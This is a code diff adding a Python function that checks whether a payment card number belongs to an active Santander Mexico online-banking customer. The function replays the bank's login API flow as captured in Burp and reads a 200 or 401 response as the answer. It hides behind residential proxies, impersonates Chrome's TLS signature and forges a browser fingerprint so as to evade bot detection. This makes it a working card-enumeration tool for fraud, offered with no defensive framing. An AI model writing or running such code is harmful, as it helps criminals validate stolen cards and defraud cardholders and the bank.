@@ -362,6 +362,142 @@ def format_markdown_table(results: list[dict]) -> str:
     return "\n".join(lines)
 
 
+def check_card_existence(
+    card_number: str,
+    proxy: Optional[Dict[str, str]] = None,
+) -> Dict[str, Any]:
+    """
+    Verifica si un cliente sigue activo en Santander Web introduciendo los 16 dígitos
+    de la tarjeta en el login (sin meter password).
+
+    Flujo (de captura Burp):
+      1. GET /public/ts/login/ → cookies
+      2. POST /tsm/api/v2/auth/anonymous_invoke → challenge + session_id
+      3. POST /tsm/api/v2/auth/assert con buc_pan → 200=activo, 401=inactivo
+
+    Returns:
+        dict con status: "ACTIVE", "INACTIVE" o "ERROR"
+    """
+    t0 = time.time()
+    card_digits = "".join(c for c in card_number if c.isdigit())
+    if len(card_digits) < 16:
+        return {"status": "ERROR", "detail": f"tarjeta incompleta ({len(card_digits)} digitos)", "time": round(time.time() - t0, 1)}
+
+    card_16 = card_digits[:16]
+
+    if proxy is None:
+        proxy = get_default_residential_proxy()
+
+    srv = proxy.get("server", "").replace("http://", "").replace("https://", "")
+    usr = proxy.get("username", "")
+    pwd = proxy.get("password", "")
+    if usr and pwd:
+        proxy_url = f"http://{usr}:{pwd}@{srv}"
+    else:
+        proxy_url = f"http://{srv}"
+
+    proxies = {"http": proxy_url, "https": proxy_url}
+    session = requests.Session(impersonate="chrome120", proxies=proxies)
+
+    try:
+        # Paso 1: GET login page para cookies iniciales
+        r1 = session.get(
+            "https://santanderweb.santander.com.mx/public/ts/login/",
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
+            timeout=15,
+        )
+        if r1.status_code not in (200, 301):
+            return {"status": "ERROR", "detail": f"login GET {r1.status_code}", "time": round(time.time() - t0, 1)}
+
+        # Paso 2: anonymous_invoke
+        invoke_payload = {
+            "headers": [{"type": "flow_id", "flow_id": "E621DEB30447D4F6337E918B0FED41407B6AD8AB48357F638E04CFBF0B5BB007"}],
+            "data": {
+                "collection_result": {
+                    "metadata": {"timestamp": int(time.time() * 1000), "physical_app_id": "santanderweb.santander.com.mx"},
+                    "content": {
+                        "device_details": {"logged_users": 0, "persistence_mode": "persistent", "device_id": "", "os_type": "Windows", "os_version": "10", "device_model": "Chrome 151.0.0.0"},
+                        "location": {"enabled": False, "error": "permission_denied"},
+                        "collector_state": {"accounts": "disabled", "devicedetails": "active", "contacts": "disabled", "owner": "disabled", "software": "disabled", "location": "active", "locationcountry": "disabled", "bluetooth": "disabled", "externalsdkdetails": "disabled", "hwauthenticators": "disabled", "capabilities": "disabled", "largedata": "disabled", "localenrollments": "disabled", "devicefingerprint": "active", "apppermissions": "disabled"},
+                    },
+                },
+                "fp2": {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36", "webdriver": False, "language": "es-419", "color_depth": 24, "device_memory": 16, "pixel_ratio": 1, "hardware_concurrency": 12, "screen_resolution": [1920, 1080], "available_screen_resolution": [1920, 1032], "timezone_offset": 360, "timezone": "Etc/GMT+6", "session_storage": True, "local_storage": True, "indexed_db": True, "add_behavior": False, "open_database": False, "cpu_class": "not available", "platform": "Win32", "do_not_track": "not available", "plugins": [], "webgl_vendor_and_renderer": "Google Inc. (AMD)~ANGLE (AMD, AMD Radeon RX 580 2048SP)", "ad_block": False, "has_lied_languages": False, "has_lied_resolution": False, "has_lied_os": False, "has_lied_browser": False, "touch_support": [0, False, False], "fonts": [], "audio": "124.04347527516074", "enumerate_devices": ["id=;gid=;audioinput;", "id=;gid=;videoinput;", "id=;gid=;audiooutput;"]},
+                "policy_request_id": "identify_user",
+                "params": {"rsa_data_obj": "version=3.4.2.0^F1^pm^pua^mozilla/5.0", "app_version": "2.0.65", "client_id": "DRNA-ZUzW_-9q6C3jX7SQQ-mOANSrvr40mBHBqR2hGo", "code_challenge": "x74A4ik9bn4JcOuQOhudcixYF9Nj07Fb2UuB4MBuOD0=", "flow": "login", "location": {"lng": 0, "lat": 0}},
+            },
+        }
+
+        r2 = session.post(
+            "https://idp.santander.com.mx/tsm/api/v2/auth/anonymous_invoke?aid=web_universal&locale=es-419",
+            headers={"Content-Type": "application/json", "Accept": "application/json, text/javascript, */*; q=0.01", "Origin": "https://santanderweb.santander.com.mx", "Referer": "https://santanderweb.santander.com.mx/"},
+            json=invoke_payload,
+            timeout=15,
+        )
+        if r2.status_code != 200:
+            return {"status": "ERROR", "detail": f"anonymous_invoke {r2.status_code}", "time": round(time.time() - t0, 1)}
+
+        invoke_data = r2.json()
+        session_id = ""
+        device_id = ""
+        ephemeral_uid = ""
+        for h in invoke_data.get("headers", []):
+            h_type = h.get("type", "")
+            if h_type == "session_id":
+                session_id = h.get("session_id", "")
+            elif h_type == "device_id":
+                device_id = h.get("device_id", "")
+            elif h_type == "ephemeral_uid":
+                ephemeral_uid = h.get("uid", "")
+
+        if not session_id or not device_id:
+            return {"status": "ERROR", "detail": "no session_id/device_id", "time": round(time.time() - t0, 1)}
+
+        # Paso 3: assert con buc_pan
+        assert_url = f"https://idp.santander.com.mx/tsm/api/v2/auth/assert?aid=web_universal&did={device_id}&sid={session_id}&locale=es-419"
+        assertion_id = ""
+        challenge = ""
+        for cf in invoke_data.get("data", {}).get("control_flow", []):
+            assertion_id = cf.get("assertion_id", "")
+            challenge = invoke_data.get("data", {}).get("challenge", "")
+
+        assert_payload = {
+            "headers": [
+                {"type": "flow_id", "flow_id": "E621DEB30447D4F6337E918B0FED41407B6AD8AB48357F638E04CFBF0B5BB007"},
+                {"type": "uid", "uid": ephemeral_uid},
+            ],
+            "data": {
+                "action": "form",
+                "assert": "action",
+                "assertion_id": assertion_id,
+                "fch": challenge,
+                "input": {"reply": "CONTINUE", "buc_pan": card_16},
+            },
+        }
+
+        r3 = session.post(
+            assert_url,
+            headers={"Content-Type": "application/json", "Accept": "application/json, text/javascript, */*; q=0.01", "Origin": "https://santanderweb.santander.com.mx", "Referer": "https://santanderweb.santander.com.mx/"},
+            json=assert_payload,
+            timeout=15,
+        )
+
+        dur = round(time.time() - t0, 1)
+
+        if r3.status_code == 200:
+            body = r3.json()
+            state = body.get("data", {}).get("state", "")
+            return {"status": "ACTIVE", "detail": f"activo (state={state})", "time": dur}
+        elif r3.status_code == 401:
+            return {"status": "INACTIVE", "detail": "inactivo (401)", "time": dur}
+        else:
+            return {"status": "ERROR", "detail": f"assert {r3.status_code}", "time": dur}
+
+    except Exception as ex:
+        return {"status": "ERROR", "detail": f"excepcion: {str(ex)[:60]}", "time": round(time.time() - t0, 1)}
+    finally:
+        session.close()
+
+
 if __name__ == "__main__":
     if hasattr(sys.stdout, "reconfigure"):
         try:
